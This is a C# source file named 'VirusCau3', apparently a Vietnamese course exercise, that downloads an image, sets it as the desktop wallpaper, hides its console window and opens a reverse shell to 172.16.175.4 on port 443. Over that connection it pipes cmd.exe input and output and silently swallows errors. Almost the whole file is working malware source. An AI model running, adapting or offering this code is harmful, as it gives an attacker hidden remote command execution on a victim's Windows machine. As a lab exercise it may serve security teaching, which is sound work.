using System;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace VirusCau3
{
    class Program
    {
        static void Main(string[] args)
        {

            //cau 3a
            if (httpstatus() == 1)
            {
                var filename = "sang.jpg";
                new WebClient().DownloadFile("https://aphoto.vn/wp-content/uploads/2019/01/anhdep6.jpg", filename);
                string path = AppDomain.CurrentDomain.BaseDirectory;
                DisplayPicture(path + filename);
                Thread.Sleep(1000);
                File.Delete(path + filename);

                //cau 3b
                reverse();
            }
            else
                WriteToFile("Sang");
            
        }
        
        private static void DisplayPicture(string file_name)//hàm thay đổi hình nền desktop
        {
            uint uni = 0;
            if (!SystemParametersInfo(SPI_desktop, 0, file_name, uni))
            {
                Console.WriteLine("Lỗi nha!");
            }
        }
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);
        private const uint SPI_desktop = 0x14;




        public static int httpstatus() //kiem tra Internet nếu có trả về 1
        {
            int a = 0;
            try
            {
                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("http://www.google.com/");
                webRequest.AllowAutoRedirect = false;
                HttpWebResponse response = (HttpWebResponse)webRequest.GetResponse();
                var status = (int)response.StatusCode;

                if (status >= 200 && status < 300)
                    a = 1;
                else
                    a = 0;
            }
            catch(Exception ex)
            {  }
            return a;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static StreamWriter streamWriter;
        public static void reverse()
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            try
            {
                using (TcpClient client = new TcpClient("172.16.175.4", 443))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // silence is golden
            }
        }
        public static void WriteToFile(string Message)
        {

            string filepath = "C:\\Users\\sang\\Desktop\\sang.txt"; //đường dẫn desktop
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ex)
                {
                    // silence is golden
                }
            }
        }
    }
}